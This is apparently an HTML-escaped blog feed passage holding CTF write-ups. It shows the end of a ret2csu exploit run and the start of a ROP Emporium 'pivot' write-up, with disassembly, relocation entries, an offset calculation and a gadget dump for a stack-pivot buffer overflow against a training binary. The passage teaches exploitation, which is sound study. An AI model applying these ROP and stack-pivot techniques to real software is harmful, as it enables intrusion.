&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    exploit()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;adamgold&lt;span style=&#34;color:#a6e22e&#34;&gt;@adamgold&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;VirtualBox:&lt;span style=&#34;color:#f92672&#34;&gt;~/&lt;/span&gt;Desktop&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ctfs&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ret2csu&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python exp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./ret2csu&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;2046&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;2046&lt;/span&gt;
[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;] sending buffer overflow
[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Receiving all data: Done (&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;B)
[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;] Process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./ret2csu&amp;#39;&lt;/span&gt; stopped &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; exit code &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; (SIGSEGV) (pid &lt;span style=&#34;color:#ae81ff&#34;&gt;2046&lt;/span&gt;)
[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] ROPE{&lt;span style=&#34;color:#f92672&#34;&gt;********&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
        
        </description>
    </item>
    
    <item>
      <title>ROP Emporium Pivot Writeup</title>
      <link>https://adamgold.github.io/posts/ropemporium-pivot/</link>
      <pubDate>Fri, 03 Jan 2020 17:06:56 +0300</pubDate>
      
      <guid>https://adamgold.github.io/posts/ropemporium-pivot/</guid>
      <description>
        
          
          
          
        
        
        &lt;p&gt;This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the &lt;code&gt;ret2win&lt;/code&gt; function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself.&lt;/p&gt;
&lt;p&gt;Using Ghidra, I spotted these functions - &lt;code&gt;pwnme&lt;/code&gt;, &lt;code&gt;ret2win&lt;/code&gt; and &lt;code&gt;uselessFunction&lt;/code&gt;. Let&amp;rsquo;s start by running the binary:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pivot by ROP Emporium
64bits

Call ret2win&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7988f10
Send your second chain now and it will land there
&amp;gt; a
Now kindly send your stack smash
&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And then some gdb disassembling:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; checksec
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Desktop/ctfs/pivot/pivot&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    RPATH:    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./&amp;#39;&lt;/span&gt;

pwndbg&amp;gt; disass main
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; main:
   0x0000000000400996 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400997 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x000000000040099a &amp;lt;+4&amp;gt;:	sub    rsp,0x10
   0x000000000040099e &amp;lt;+8&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2016db&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x602080 &amp;lt;stdout@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x00000000004009a5 &amp;lt;+15&amp;gt;:	mov    ecx,0x0
   0x00000000004009aa &amp;lt;+20&amp;gt;:	mov    edx,0x2
   0x00000000004009af &amp;lt;+25&amp;gt;:	mov    esi,0x0
   0x00000000004009b4 &amp;lt;+30&amp;gt;:	mov    rdi,rax
   0x00000000004009b7 &amp;lt;+33&amp;gt;:	call   0x400870 &amp;lt;setvbuf@plt&amp;gt;
   0x00000000004009bc &amp;lt;+38&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2016dd&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020a0 &amp;lt;stderr@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x00000000004009c3 &amp;lt;+45&amp;gt;:	mov    ecx,0x0
   0x00000000004009c8 &amp;lt;+50&amp;gt;:	mov    edx,0x2
   0x00000000004009cd &amp;lt;+55&amp;gt;:	mov    esi,0x0
   0x00000000004009d2 &amp;lt;+60&amp;gt;:	mov    rdi,rax
   0x00000000004009d5 &amp;lt;+63&amp;gt;:	call   0x400870 &amp;lt;setvbuf@plt&amp;gt;
   0x00000000004009da &amp;lt;+68&amp;gt;:	mov    edi,0x400b98
   0x00000000004009df &amp;lt;+73&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x00000000004009e4 &amp;lt;+78&amp;gt;:	mov    edi,0x400bae
   0x00000000004009e9 &amp;lt;+83&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x00000000004009ee &amp;lt;+88&amp;gt;:	mov    edi,0x1000000
   0x00000000004009f3 &amp;lt;+93&amp;gt;:	call   0x400860 &amp;lt;malloc@plt&amp;gt;
   0x00000000004009f8 &amp;lt;+98&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x8&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,rax
   0x00000000004009fc &amp;lt;+102&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x8&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a00 &amp;lt;+106&amp;gt;:	add    rax,0xffff00
   0x0000000000400a06 &amp;lt;+112&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,rax
   0x0000000000400a0a &amp;lt;+116&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a0e &amp;lt;+120&amp;gt;:	mov    rdi,rax
   0x0000000000400a11 &amp;lt;+123&amp;gt;:	call   0x400a3b &amp;lt;pwnme&amp;gt;
   0x0000000000400a16 &amp;lt;+128&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x0000000000400a1e &amp;lt;+136&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x8&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a22 &amp;lt;+140&amp;gt;:	mov    rdi,rax
   0x0000000000400a25 &amp;lt;+143&amp;gt;:	call   0x4007f0 &amp;lt;free@plt&amp;gt;
   0x0000000000400a2a &amp;lt;+148&amp;gt;:	mov    edi,0x400bb6
   0x0000000000400a2f &amp;lt;+153&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x0000000000400a34 &amp;lt;+158&amp;gt;:	mov    eax,0x0
   0x0000000000400a39 &amp;lt;+163&amp;gt;:	leave
   0x0000000000400a3a &amp;lt;+164&amp;gt;:	ret
End of assembler dump.
pwndbg&amp;gt; disass pwnme
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; pwnme:
   0x0000000000400a3b &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400a3c &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0000000000400a3f &amp;lt;+4&amp;gt;:	sub    rsp,0x30
   0x0000000000400a43 &amp;lt;+8&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x28&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,rdi
   0x0000000000400a47 &amp;lt;+12&amp;gt;:	lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a4b &amp;lt;+16&amp;gt;:	mov    edx,0x20
   0x0000000000400a50 &amp;lt;+21&amp;gt;:	mov    esi,0x0
   0x0000000000400a55 &amp;lt;+26&amp;gt;:	mov    rdi,rax
   0x0000000000400a58 &amp;lt;+29&amp;gt;:	call   0x400820 &amp;lt;memset@plt&amp;gt;
   0x0000000000400a5d &amp;lt;+34&amp;gt;:	mov    edi,0x400bc0
   0x0000000000400a62 &amp;lt;+39&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x0000000000400a67 &amp;lt;+44&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x28&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a6b &amp;lt;+48&amp;gt;:	mov    rsi,rax
   0x0000000000400a6e &amp;lt;+51&amp;gt;:	mov    edi,0x400be0
   0x0000000000400a73 &amp;lt;+56&amp;gt;:	mov    eax,0x0
   0x0000000000400a78 &amp;lt;+61&amp;gt;:	call   0x400810 &amp;lt;printf@plt&amp;gt;
   0x0000000000400a7d &amp;lt;+66&amp;gt;:	mov    edi,0x400c20
   0x0000000000400a82 &amp;lt;+71&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x0000000000400a87 &amp;lt;+76&amp;gt;:	mov    edi,0x400c52
   0x0000000000400a8c &amp;lt;+81&amp;gt;:	mov    eax,0x0
   0x0000000000400a91 &amp;lt;+86&amp;gt;:	call   0x400810 &amp;lt;printf@plt&amp;gt;
   0x0000000000400a96 &amp;lt;+91&amp;gt;:	mov    rdx,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2015f3&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x602090 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x0000000000400a9d &amp;lt;+98&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x28&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400aa1 &amp;lt;+102&amp;gt;:	mov    esi,0x100
   0x0000000000400aa6 &amp;lt;+107&amp;gt;:	mov    rdi,rax
   0x0000000000400aa9 &amp;lt;+110&amp;gt;:	call   0x400840 &amp;lt;fgets@plt&amp;gt;
   0x0000000000400aae &amp;lt;+115&amp;gt;:	mov    edi,0x400c58
   0x0000000000400ab3 &amp;lt;+120&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x0000000000400ab8 &amp;lt;+125&amp;gt;:	mov    edi,0x400c52
   0x0000000000400abd &amp;lt;+130&amp;gt;:	mov    eax,0x0
   0x0000000000400ac2 &amp;lt;+135&amp;gt;:	call   0x400810 &amp;lt;printf@plt&amp;gt;
   0x0000000000400ac7 &amp;lt;+140&amp;gt;:	mov    rdx,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2015c2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x602090 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x0000000000400ace &amp;lt;+147&amp;gt;:	lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400ad2 &amp;lt;+151&amp;gt;:	mov    esi,0x40
   0x0000000000400ad7 &amp;lt;+156&amp;gt;:	mov    rdi,rax
   0x0000000000400ada &amp;lt;+159&amp;gt;:	call   0x400840 &amp;lt;fgets@plt&amp;gt;
   0x0000000000400adf &amp;lt;+164&amp;gt;:	nop
   0x0000000000400ae0 &amp;lt;+165&amp;gt;:	leave
   0x0000000000400ae1 &amp;lt;+166&amp;gt;:	ret
End of assembler dump.
pwndbg&amp;gt; disass uselessFunction
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; uselessFunction:
   0x0000000000400ae2 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400ae3 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0000000000400ae6 &amp;lt;+4&amp;gt;:	mov    eax,0x0
   0x0000000000400aeb &amp;lt;+9&amp;gt;:	call   0x400850 &amp;lt;foothold_function@plt&amp;gt;
   0x0000000000400af0 &amp;lt;+14&amp;gt;:	mov    edi,0x1
   0x0000000000400af5 &amp;lt;+19&amp;gt;:	call   0x400880 &amp;lt;exit@plt&amp;gt;
End of assembler dump.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NX enabled, meaning we can not execute nothing on the stack. We have two stages of shellcode (also can be seen when running the binary) - First one uses &lt;code&gt;fgets&lt;/code&gt; and stores the input on previously allocated buffer, and the second one is vulnerable to buffer overflow.&lt;/p&gt;
&lt;p&gt;From the &lt;code&gt;uselessFunction&lt;/code&gt; disassembly, we can see that it just calls the &lt;code&gt;foothold_function&lt;/code&gt; from &lt;code&gt;libpivot.so&lt;/code&gt;. But &lt;code&gt;uselessFunction&lt;/code&gt; isnâ€™t called anywhere in the code, so in order to populate the &lt;code&gt;.got.plt&lt;/code&gt; entry, we have to first call the &lt;code&gt;foothold_function&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s design a basic plan:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Call the foothold_function to populate the .got.plt entry.&lt;/li&gt;
&lt;li&gt;Add the offset between &lt;code&gt;ret2win&lt;/code&gt; to &lt;code&gt;foothold_function&lt;/code&gt; to get our &lt;code&gt;ret2win&lt;/code&gt; function.&lt;/li&gt;
&lt;li&gt;Call it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&amp;rsquo;s get the &lt;code&gt;ret2win&lt;/code&gt; and &lt;code&gt;foothold_function&lt;/code&gt; addresses:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Desktop/CTFs/pivot$ objdump -d ./libpivot.soÂ Â | grep ret2win

0000000000000abe :

adamgold@adamgold-VirtualBox:~/Desktop/CTFs/pivot$ objdump -d ./libpivot.soÂ Â | grep foothold_function

&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000970&lt;/span&gt; :
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The offset:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; p/x 0x0000000000000abe - 0x0000000000000970
$2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x14e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And the .got.plt address of &lt;code&gt;foothold_function&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Relocation section &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.rela.plt&amp;#39;&lt;/span&gt; at offset 0x6c8 contains &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; entries:

Â Â OffsetÂ Â Â Â Â Â Â Â Â Â InfoÂ Â Â Â Â Â Â Â Â Â Â TypeÂ Â Â Â Â Â Â Â Â Â Â Sym. ValueÂ Â Â Â Sym. Name + Addend

000000602018Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000100000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; free@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602020Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000300000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; puts@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602028Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000400000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; printf@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602030Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000500000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; memset@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602038Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000600000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; __libc_start_main@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602040Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000700000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; fgets@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602048Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000900000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; foothold_function + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602050Â Â 000a00000007 R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; malloc@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602058Â Â 000b00000007 R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; setvbuf@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602060Â Â 000d00000007 R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; exit@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;gadget-hunt&#34;&gt;Gadget Hunt&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Desktop/ctfs/pivot$ ropper --file pivot
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Load gadgets from cache
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;LOAD&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; loading... 100%
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;LOAD&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; removing double gadgets... 100%



Gadgets
&lt;span style=&#34;color:#f92672&#34;&gt;=======&lt;/span&gt;


0x0000000000400b7f: add bl, dh; ret;
0x0000000000400984: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax - 0x7b&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, cl; sal byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcx + rsi*8 + 0x55&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, 0x48; mov ebp, esp; call rax;
0x0000000000400b7d: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add bl, dh; ret;
0x0000000000400982: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax - 0x7b&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, cl; sal byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcx + rsi*8 + 0x55&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, 0x48; mov ebp, esp; call rax;
0x0000000000400b7b: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add bl, dh; ret;
0x00000000004008fc: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; pop rbp; ret;
0x0000000000400a35: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; leave; ret;
0x0000000000400a36: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add cl, cl; ret;
0x00000000004007cb: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add rsp, 8; ret;
0x0000000000400af3: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400ad5: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400afe: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; pop rax; ret;
0x00000000004008fe: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; pop rbp; ret;
0x0000000000400b82: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; sub rsp, 8; add rsp, 8; ret;
0x00000000004008e8: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400936: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400983: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400a37: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; leave; ret;
0x0000000000400afd: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, r8b; pop rax; ret;
0x0000000000400a38: add cl, cl; ret;
0x0000000000400af1: add dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, eax; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400964: add eax, 0x20173e; add ebx, esi; ret;
0x0000000000400b0a: add eax, ebp; ret;
0x0000000000400969: add ebx, esi; ret;
0x00000000004007ce: add esp, 8; ret;
0x0000000000400b09: add rax, rbp; ret;
0x00000000004007cd: add rsp, 8; ret;
0x00000000004008f2: and byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, ah; jmp rax;
0x0000000000400967: and byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add ebx, esi; ret;
0x0000000000400a25: call 0x7f0; mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
